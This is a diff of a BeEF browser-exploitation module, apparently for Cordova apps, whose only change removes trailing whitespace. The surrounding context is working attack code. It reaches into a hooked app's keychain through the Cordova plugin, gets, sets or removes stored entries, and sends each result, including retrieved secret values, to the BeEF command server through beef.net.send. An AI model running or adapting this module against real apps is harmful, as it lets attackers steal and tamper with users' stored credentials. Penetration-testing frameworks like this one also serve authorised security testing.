@@ -18,50 +18,50 @@ beef.execute(function() {
         kc = cordova.require("cordova/plugin/keychain");
     } catch (err) {
         result = 'Unable to access keychain plugin';
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
     }
 
     function onGet()
-    {  
+    {
         var win = function(value) {
             result = result + "GET SUCCESS - Key: " + key + " Value: " + value;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
 
         };
         var fail = function(error) {
             result = result + "GET FAIL - Key: " + key + " Error: " + error;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
         };
-        
+
         kc.getForKey(win, fail, key, servicename);
 
     }
-    
+
     function onSet()
-    {        
+    {
         var win = function() {
             result = result + "SET SUCCESS - Key: " + key;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
         };
         var fail = function(error) {
             result = result + "SET FAIL - Key: " + key + " Error: " + error;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
         };
-        
+
         kc.setForKey(win, fail, key, servicename, value);
     }
-    
+
     function onRemove()
     {
         var win = function() {
             result = result + "REMOVE SUCCESS - Key: " + key;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
         };
         var fail = function(error) {
             result = result + "REMOVE FAIL - Key: " + key + " Error: " + error;
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
         };
-        
+
         kc.removeForKey(win, fail, key, servicename);
     }
 
@@ -77,6 +77,6 @@ beef.execute(function() {
                 onRemove();
                 break;
         }
-    } 
+    }
 
 });
